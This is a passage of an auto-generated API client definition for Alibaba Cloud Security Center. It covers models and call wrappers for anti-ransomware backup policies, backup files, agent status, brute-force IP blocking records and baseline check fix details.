  clients?: [ 
    {
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000az2f537r73dyh****'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent.

Valid values:

*   **INSTALLING**: The agent is being installed.
*   **ONLINE**: The agent is online.
*   **UNINSTALLING**: The agent is being uninstalled.
*   **NOT_INSTALLED**: The agent is not installed.
*   **ACTIVATED**: The agent is enabled.
*   **CLIENT\\_CONNECTION_ERROR**: A connection error occurs on the agent.', example='ONLINE'),
      clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.0.0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance on which the anti-ransomware agent is installed.', example='i-bp15hyph4aci99dv****'),
      uuid?: string(name='Uuid', description='The UUID of the Elastic Compute Service (ECS) instance on which the anti-ransomware agent is installed.', example='22f6550d-f294-449b-b6e6-90638fd1****'),
    }
  ](name='Clients', description='An array that consists of the information about the anti-ransomware agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E3ED094C-9EB7-4239-962B-D0FB3D5F23C7'),
}

model DescribeBackupClientsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupClientsResponseBody(name='body'),
}

/**
  * You can call the DescribeBackupClients operation to query the servers on which the anti-ransomware agent is installed in a specified region.
  *
  * @param request DescribeBackupClientsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeBackupClientsResponse
 */
async function describeBackupClientsWithOptions(request: DescribeBackupClientsRequest, runtime: Util.RuntimeOptions): DescribeBackupClientsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.supportRegionId)) {
    query['SupportRegionId'] = request.supportRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupClients',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the DescribeBackupClients operation to query the servers on which the anti-ransomware agent is installed in a specified region.
  *
  * @param request DescribeBackupClientsRequest
  * @return DescribeBackupClientsResponse
 */
async function describeBackupClients(request: DescribeBackupClientsRequest): DescribeBackupClientsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupClientsWithOptions(request, runtime);
}

model DescribeBackupFilesRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  path?: string(name='Path', description='The path to the backup file.', example='“”'),
  snapshotHash?: string(name='SnapshotHash', description='The hash value of the backup file.', example='a7f26223ef3974c6fac324cd37713ab65ab618859d20b4039192a5da44d77b63'),
  uuid?: string(name='Uuid', description='The UUID of the server to which an anti-ransomware policy is applied.', example='6d5b361f-958d-48a8-a9d2-d6e82c1a****'),
}

model DescribeBackupFilesResponseBody = {
  backupFiles?: [ 
    {
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='Group 1'),
      size?: long(name='Size', description='The size of the backup file. Unit: bytes.', example='100'),
      subtree?: string(name='Subtree', description='The path to the subdirectory of the backup file.', example='Python27\\'),
      type?: string(name='Type', description='The type of the protected file. Valid values:

*   **file**: files
*   **dir**: folders', example='dir'),
    }
  ](name='BackupFiles', description='An array that consists of the backup files returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of backup files returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of backup files returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00A60A6D-33E0-5D5A-9B7C-E5D4DCA88148'),
}

model DescribeBackupFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupFilesResponseBody(name='body'),
}

async function describeBackupFilesWithOptions(request: DescribeBackupFilesRequest, runtime: Util.RuntimeOptions): DescribeBackupFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupFiles(request: DescribeBackupFilesRequest): DescribeBackupFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupFilesWithOptions(request, runtime);
}

model DescribeBackupMachineStatusRequest {
  policyId?: long(name='PolicyId', example='123'),
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuid?: string(name='Uuid', example='eb2c782e-64f2-4590-a86c-d90164df****'),
}

model DescribeBackupMachineStatusResponseBody = {
  backupMachineStatus?: {
    clientId?: string(name='ClientId', example='c-000dbefaw9f7gnbw****'),
    clientStatus?: string(name='ClientStatus', example='ONLINE'),
    clientVersion?: string(name='ClientVersion', example='2.11.0'),
    errorCode?: string(name='ErrorCode', example='CLIENT_CONNECTION_ERROR'),
    errorList?: [ 
      {
        errorCode?: string(name='ErrorCode', example='TARGET_NOT_EXIST'),
        errorStatus?: string(name='ErrorStatus', example='FAILED'),
      }
    ](name='ErrorList'),
    instanceId?: string(name='InstanceId', example='i-2zeaqkb80vloxjcj****'),
    regionId?: string(name='RegionId', example='cn-shenzhen'),
    savedBackupCount?: int32(name='SavedBackupCount', example='7'),
    status?: string(name='Status', example='ACTIVATED'),
    uuid?: string(name='Uuid', example='eb2c782e-64f2-4590-a86c-d90164df****'),
    vaultId?: string(name='VaultId', example='v-0005i2qh5fcr6seo****'),
  }(name='BackupMachineStatus'),
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeBackupMachineStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupMachineStatusResponseBody(name='body'),
}

async function describeBackupMachineStatusWithOptions(request: DescribeBackupMachineStatusRequest, runtime: Util.RuntimeOptions): DescribeBackupMachineStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupMachineStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupMachineStatus(request: DescribeBackupMachineStatusRequest): DescribeBackupMachineStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupMachineStatusWithOptions(request, runtime);
}

model DescribeBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The information that you want to use to identify the servers protected by the anti-ransomware policy. You can enter the IP address or ID of a server.', example='1.1.XX.XX'),
  name?: string(name='Name', description='The name of the anti-ransomware policy that you want to query.', example='SecurityStrategy-20200303'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10'),
  status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled'),
}

model DescribeBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of anti-ransomware policies returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  policies?: [ 
    {
      clientErrorCount?: int32(name='ClientErrorCount', description='The number of the servers on which the anti-ransomware agent is in an abnormal state.', example='2'),
      clientErrorUuidList?: [ string ](name='ClientErrorUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in an **abnormal** state.'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
      healthClientCount?: int32(name='HealthClientCount', description='The number of the servers on which the anti-ransomware agent is in a normal state.', example='2'),
      healthClientUuidList?: [ string ](name='HealthClientUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in a **normal** state.'),
      id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='11'),
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='SecurityStrategy-20200303'),
      policy?: string(name='Policy', description='The configurations of the anti-ransomware policy. The value of this parameter is in the JSON format and contains the following fields:

*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that are protected. If the value of this field is \\[], all formats of files are protected.

*   **Source**: the directory that is protected. If the value of this field is \\[], all directories are protected.

*   **ExcludeSystemPath**: indicates whether a specified directory is excluded from the anti-ransomware policy. If the value of this field is **true**, the directory is excluded. If this field is left empty, no directories are excluded.

*   **Exclude**: the directory that is excluded from the anti-ransomware policy. If no directory is specified, the value of this field is \\[].

*   **Schedule**: the start time and interval of a data backup task. A start time that begins during off-peak hours but does not start on the hour is recommended. Examples:

    *   If the value of this field is I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If the value of this field is I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If the value of this field is 7, backup data is retained for a week. If the value of this field is 365, backup data is retained for a year. If the value of this field is -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If the value of this field is 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: indicates whether the VSS feature is enabled. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows\\\\","Python27\\\\","Program Files (x86)\\\\","Program Files\\\\","Boot\\\\","$RECYCLE.BIN","System Volume Information\\\\","Users\\\\Administrator\\\\NTUSER.DAT*","ProgramData\\\\","pagefile.sys","Users\\\\Default\\\\NTUSER.DAT*","Users\\\\Administrator\\\\ntuser.*"],"ExcludeSystemPath":true,"Include":[],"IsDefault":1,"Retention":7,"Schedule":"I|1630689360|PT24H","Source":[],"SpeedLimiter":"","UseVss":true}'),
      policyRegionId?: string(name='PolicyRegionId', description='The ID of the region that you specified for data backup when you installed the anti-ransomware agent for the server not deployed on Alibaba Cloud.', example='ch-hangzhou'),
      policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   1.0.0
*   2.0.0', example='2.0.0'),
      remarkedUuidList?: [ string ](name='RemarkedUuidList', description='The UUIDs that are returned based on the value of the MachineRemark request parameter.'),
      serverType?: string(name='ServerType', description='The type of the server. Valid values:

*   **OUT_CLOUD**: server not deployed on Alibaba Cloud
*   **ALIYUN**: Elastic Compute Service (ECS) instance
*   **TRIPARTITE**: simple application server', example='OUT_CLOUD'),
      serviceErrorCount?: int32(name='ServiceErrorCount', description='The number of servers on which data backup is exceptional.', example='2'),
      serviceErrorUuidList?: [ string ](name='ServiceErrorUuidList', description='The UUIDs of the servers on which data backup is exceptional.'),
      status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled'),
      upgradeStatus?: string(name='UpgradeStatus', description='The upgrade status of the anti-ransomware policy. Valid values:

*   **NotUpgraded**
*   **Upgrading**
*   **UpgradeFailed**
*   **UpgradeSuccess**', example='Upgrading'),
      uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.'),
    }
  ](name='Policies', description='An array that consists of the anti-ransomware policies returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPoliciesResponseBody(name='body'),
}

async function describeBackupPoliciesWithOptions(request: DescribeBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicies(request: DescribeBackupPoliciesRequest): DescribeBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPoliciesWithOptions(request, runtime);
}

model DescribeBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='51880'),
}

model DescribeBackupPolicyResponseBody = {
  backupPolicyDetail?: {
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
    id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='51880'),
    name?: string(name='Name', description='The name of the anti-ransomware policy.', example='testBuckUp'),
    policy?: string(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to \\[].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to \\[].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to \\[].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{
      "Exclude": [
            "/bin/",
            "/usr/bin/",
            "/sbin/",
            "/boot/",
            "/proc/",
            "/sys/",
            "/srv/",
            "/lib/",
            "/selinux/",
            "/usr/sbin/",
            "/run/",
            "/lib32/",
            "/lib64/",
            "/lost+found/",
            "/var/lib/kubelet/",
            "/var/lib/ntp/proc",
            "/var/lib/container",
            "Windows\\\\",
            "Python27\\\\",
            "Program Files (x86)\\\\",
            "Program Files\\\\",
            "Boot\\\\",
            "$RECYCLE.BIN",
            "System Volume Information\\\\",
            "Users\\\\Administrator\\\\NTUSER.DAT*",
            "ProgramData\\\\",
            "pagefile.sys",
            "Users\\\\Default\\\\NTUSER.DAT*",
            "Users\\\\Administrator\\\\ntuser.*"
      ],
      "ExcludeSystemPath": true,
      "Include": [],
      "IsDefault": 1,
      "Retention": 7,
      "Schedule": "I|1630689360|PT24H",
      "Source": [],
      "SpeedLimiter": "",
      "UseVss": true
}'),
    policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy.

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
    regionId?: string(name='RegionId', description='The ID of the region in which backup data is stored.', example='cn-beijing'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='closed'),
    uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the anti-ransomware policy is applied.'),
  }(name='BackupPolicyDetail', description='The details of the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPolicyResponseBody(name='body'),
}

async function describeBackupPolicyWithOptions(request: DescribeBackupPolicyRequest, runtime: Util.RuntimeOptions): DescribeBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicy(request: DescribeBackupPolicyRequest): DescribeBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPolicyWithOptions(request, runtime);
}

model DescribeBackupRestoreCountResponseBody = {
  backupRestoreCount?: {
    recovering?: int32(name='Recovering', description='The number of the restoration tasks that are in the **being restored** state.', example='3'),
    total?: int32(name='Total', description='The total number of the restoration tasks that you create.', example='30'),
  }(name='BackupRestoreCount', description='The statistics of restoration tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeBackupRestoreCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupRestoreCountResponseBody(name='body'),
}

/**
  * If you have created restoration tasks, you can call this operation to query the number of restoration tasks that are in the **restored** or **being restored** state.
  *
  * @param request DescribeBackupRestoreCountRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCountWithOptions(runtime: Util.RuntimeOptions): DescribeBackupRestoreCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeBackupRestoreCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If you have created restoration tasks, you can call this operation to query the number of restoration tasks that are in the **restored** or **being restored** state.
  *
  * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCount(): DescribeBackupRestoreCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupRestoreCountWithOptions(runtime);
}

model DescribeBruteForceRecordsRequest {
  blockIp?: string(name='BlockIp', example='175.106.XX.XX'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', example='1'),
}

model DescribeBruteForceRecordsResponseBody = {
  machineList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', example='1671506882063'),
      blockIp?: string(name='BlockIp', example='10.12.XX.XX'),
      errorCode?: string(name='ErrorCode', example='InstanceSecurityGroupLimitExceeded'),
      id?: long(name='Id', example='112XX'),
      instanceName?: string(name='InstanceName', example='record-test-***'),
      internetIp?: string(name='InternetIp', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='192.168.XX.XX'),
      port?: string(name='Port', example='22/22'),
      ruleName?: string(name='RuleName', example='AntiRuleName'),
      source?: string(name='Source', example='userRule'),
      status?: int32(name='Status', example='2'),
      uuid?: string(name='Uuid', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
    }
  ](name='MachineList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='263'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeBruteForceRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceRecordsResponseBody(name='body'),
}

async function describeBruteForceRecordsWithOptions(request: DescribeBruteForceRecordsRequest, runtime: Util.RuntimeOptions): DescribeBruteForceRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceRecords(request: DescribeBruteForceRecordsRequest): DescribeBruteForceRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceRecordsWithOptions(request, runtime);
}

model DescribeBruteForceSummaryRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='203.119.XX.XX'),
}

model DescribeBruteForceSummaryResponseBody = {
  bruteForceSummary?: {
    allStrategyCount?: int32(name='AllStrategyCount', description='The total number of IP address blocking policies.', example='13'),
    effectiveCount?: int32(name='EffectiveCount', description='The number of enabled IP address blocking policies.', example='2'),
  }(name='BruteForceSummary', description='The statistics of IP address blocking policies.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE60EAE3-ABD0-897C-B0F16CAC6C7D'),
}

model DescribeBruteForceSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceSummaryResponseBody(name='body'),
}

async function describeBruteForceSummaryWithOptions(request: DescribeBruteForceSummaryRequest, runtime: Util.RuntimeOptions): DescribeBruteForceSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceSummary(request: DescribeBruteForceSummaryRequest): DescribeBruteForceSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceSummaryWithOptions(request, runtime);
}

model DescribeCheckEcsWarningsRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model DescribeCheckEcsWarningsResponseBody = {
  canTry?: string(name='CanTry', description='Indicates whether you use the free trial of Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  sasVersion?: string(name='SasVersion', description='The edition of Security Center that you use. Valid values:

*   **1**: Basic edition
*   **2** or **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition

>  Both the value 2 and the value 3 indicate the Enterprise edition.', example='3'),
  weakPasswordCount?: string(name='WeakPasswordCount', description='The number of weak passwords that can cause high risks to your assets.', example='3'),
}

model DescribeCheckEcsWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckEcsWarningsResponseBody(name='body'),
}

async function describeCheckEcsWarningsWithOptions(request: DescribeCheckEcsWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckEcsWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckEcsWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckEcsWarnings(request: DescribeCheckEcsWarningsRequest): DescribeCheckEcsWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckEcsWarningsWithOptions(request, runtime);
}

model DescribeCheckFixDetailsRequest {
  checkIds?: string(name='CheckIds', example='58'),
  lang?: string(name='Lang', example='zh'),
  riskId?: long(name='RiskId', example='51'),
}

model DescribeCheckFixDetailsResponseBody = {
  checkFixDetails?: [ 
    {
      checkDesc?: string(name='CheckDesc', example='Force users not to reuse recently used passwords to reduce the risk of password guessing attacks'),
      checkId?: long(name='CheckId', example='58'),
      checkItem?: string(name='CheckItem', example='Ensure password reuse is limited'),
      rules?: [ 
        {
          checkId?: long(name='CheckId', example='58'),
          defaultValue?: int32(name='DefaultValue', example='1'),
          optional?: int32(name='Optional', example='1'),
          paramList?: [ 
            {
              enumValue?: string(name='EnumValue', example='0,1,2,3'),
              maxValue?: int32(name='MaxValue', example='24'),
              minValue?: int32(name='MinValue', example='5'),
              paramDefaultValue?: string(name='ParamDefaultValue', example='5'),
              paramDesc?: string(name='ParamDesc', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
              paramName?: string(name='ParamName', example='range_val'),
              paramType?: int32(name='ParamType', example='1'),
              ruleId?: string(name='RuleId', example='pwd_reuse.system_auth'),
              value?: string(name='Value', example='18'),
            }
          ](name='ParamList'),
          ruleDesc?: string(name='RuleDesc', example='(/etc/system-auth)Force users not to reuse the number of recently used passwords between 5 and 24'),
          ruleId?: string(name='RuleId', example='pwd_reuse.system_auth'),
          value?: int32(name='Value', example='5'),
          varName?: string(name='VarName', example='open'),
        }
      ](name='Rules'),
    }
  ](name='CheckFixDetails'),
  count?: int32(name='Count', example='20'),
  requestId?: string(name='RequestId', example='0DBF1E27-98D8-5EC2-9CF3-4A2E26F6****'),
}

model DescribeCheckFixDetailsResponse = {
